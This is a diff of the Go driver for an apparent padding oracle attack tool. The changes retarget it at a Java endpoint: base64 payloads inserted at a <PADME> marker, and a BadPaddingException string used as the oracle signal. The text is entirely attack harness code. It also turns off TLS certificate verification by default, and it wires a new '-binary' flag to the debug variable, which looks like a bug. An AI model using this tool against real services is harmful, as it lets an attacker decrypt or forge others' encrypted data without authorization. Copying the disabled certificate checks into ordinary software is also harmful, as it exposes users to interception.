@@ -1,19 +1,21 @@
 package main
 
 import (
+	"crypto/tls"
+	"encoding/base64"
 	"flag"
 	"fmt"
+	"net"
 	"net/http"
 	_ "net/http/pprof"
 	"net/url"
 
-	"encoding/hex"
 	"io/ioutil"
 	"strings"
 
 	"log"
 
-	"github.com/swarley7/padoracle/libpadoracle"
+	"./libpadoracle"
 )
 
 type testpad struct {
@@ -24,9 +26,16 @@ type testpad struct {
 	Client  *http.Client
 }
 
+const (
+	MaxIdleConnections int = 20
+	RequestTimeout     int = 5
+)
+
+var DefaultDialer = &net.Dialer{}
+
 // EncodePayload turns the raw oracle payload (IV + Ciphertext) into whatever format is required by the endpoint server. Modify this routine to suit the specific needs of the application.
 func (t testpad) EncodePayload(RawPadOraclePayload []byte) (encodedPayload string) {
-	encodedPayload = hex.EncodeToString(RawPadOraclePayload)
+	encodedPayload = base64.URLEncoding.EncodeToString(RawPadOraclePayload)
 	return encodedPayload
 }
 
@@ -35,7 +44,7 @@ func (t testpad) DecodeCiphertextPayload(EncodedPayload string) []byte {
 	var decoded []byte
 	//****** EDIT this function to suit your particular ciphertext's encoding. ********//
 	// This function should return a byte array of the ciphertext's raw bytes //
-	decoded, err := hex.DecodeString(EncodedPayload)
+	decoded, err := base64.URLEncoding.DecodeString(EncodedPayload)
 	libpadoracle.Check(err)
 	return decoded
 }
@@ -57,7 +66,6 @@ func (t testpad) CallOracle(encodedPayload string) bool {
 	if !strings.Contains(t.URL, "<PADME>") && !strings.Contains(t.Data, "<PADME>") && !strings.Contains(t.Cookies, "<PADME>") {
 		panic("No marker supplied in URL or data")
 	}
-
 	req, err := http.NewRequest(t.Method, strings.Replace(t.URL, "<PADME>", encodedPayload, -1), strings.NewReader(strings.Replace(t.Data, "<PADME>", encodedPayload, -1)))
 	libpadoracle.Check(err)
 
@@ -77,7 +85,7 @@ func (t testpad) CheckResponse(resp Resp) bool {
 	// Sample - the server's response includes the string "not padded correctly"
 	// matched, _ := regexp.MatchString(`not padded correctly`, resp.BodyData)
 	// fmt.Println(matched, err)
-	if resp.ResponseCode == 500 {
+	if strings.Contains(resp.BodyData, "javax.crypto.BadPaddingException") {
 		return false
 	}
 	return true
@@ -93,6 +101,7 @@ func main() {
 	var data string
 	var proxyUrl string
 	var cookies string
+	var ignoreTls bool
 
 	flag.StringVar(&cipherText, "c", "", "Provide the base ciphertext that you're trying to decipher (ripped straight from your request)")
 	flag.StringVar(&plainText, "p", "", "Provide the plaintext that you're trying to encrypt through exploitation of the padding oracle (for use with mode = 1)")
@@ -110,6 +119,9 @@ func main() {
 	flag.IntVar(&cfg.Mode, "m", 0, "0 = Decrypt; 1 = Encrypt. Note: Encryption through a padding oracle cannot be concurrently performed (as far as I can determine). A single thread is used in this mode.")
 	flag.BoolVar(&cfg.Debug, "d", false, "Debug mode")
 
+	flag.BoolVar(&cfg.Debug, "binary", false, "Binary mode (default is to expect the resultant plaintext to be ASCII printable chars) - set to `true` if you're dealing with bin data or unicode emojiz")
+	flag.BoolVar(&ignoreTls, "k", true, "Nobody cares about TLS certificate errors, but maybe you do?")
+
 	flag.Parse()
 	if Url == "" {
 		log.Fatal("No URL supplied.")
@@ -120,14 +132,16 @@ func main() {
 			http.ListenAndServe("localhost:6060", nil)
 		}()
 	}
-	client := &http.Client{}
+
+	httpTransport := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: ignoreTls}, Dial: DefaultDialer.Dial, MaxIdleConnsPerHost: MaxIdleConnections}
+	client := &http.Client{Transport: httpTransport}
 
 	if proxyUrl != "" {
 		pURL, err := url.Parse(proxyUrl)
 		if err != nil {
 			log.Fatal("Busted ProxyURL...", proxyUrl)
 		}
-		client.Transport = &http.Transport{Proxy: http.ProxyURL(pURL)}
+		client.Transport = &http.Transport{Proxy: http.ProxyURL(pURL), TLSClientConfig: &tls.Config{InsecureSkipVerify: ignoreTls}}
 	}
 	cfg.Pad = testpad{URL: Url, Method: method, Data: data, Client: client}
 	cfg.TargetPlaintext = []byte(plainText)
